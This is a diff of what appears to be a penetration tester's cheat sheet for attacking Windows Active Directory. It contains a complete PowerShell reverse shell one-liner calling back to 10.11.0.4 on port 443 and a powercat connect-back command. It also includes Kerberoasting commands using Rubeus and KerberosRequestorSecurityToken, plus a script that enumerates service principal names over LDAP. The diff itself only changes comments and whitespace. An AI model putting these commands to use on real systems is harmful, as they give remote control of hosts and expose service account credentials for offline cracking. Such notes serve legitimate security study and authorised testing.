@@ -139,7 +139,7 @@ klist   # list the cached Kerberos tickets
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken-ArgumentList '[serviceprincipalname]'
 Rubeus.exe kerberoast /tgtdeleg /user:[samaccountname]
-
+# Crack with hashcat
 ---------------Reverse Shell----------------
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
@@ -228,29 +228,19 @@ on Windows:
 powercat -c 10.11.0.4 -p 443 -i C:\Users\admin\powercat.ps1
 ```
 
-### Kerberoasting with Rubeus
+### enumSPN.ps1
 
 ```powershell
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-
 $PDC = ($domainObj.PdcRoleOwner).Name
-
 $SearchString = "LDAP://"
-
 $SearchString += $PDC + "/"
-
 $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
-
 $SearchString += $DistinguishedName
-
 $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-
 $objDomain = New-Object System.DirectoryServices.DirectoryEntry
-
 $Searcher.filter = "serviceprincipalname=*"
-
 $Result = $Searcher.FindAll()
-
 Foreach($obj in $Result)
 {
 	Foreach($prop in $obj.Properties)
@@ -260,7 +250,6 @@ Foreach($obj in $Result)
 	Write-Host "------------------------"
 }
 ```
-
 1. Find interesting SPN (Service Principal Name)
 2. Get its SAMaccountname
 
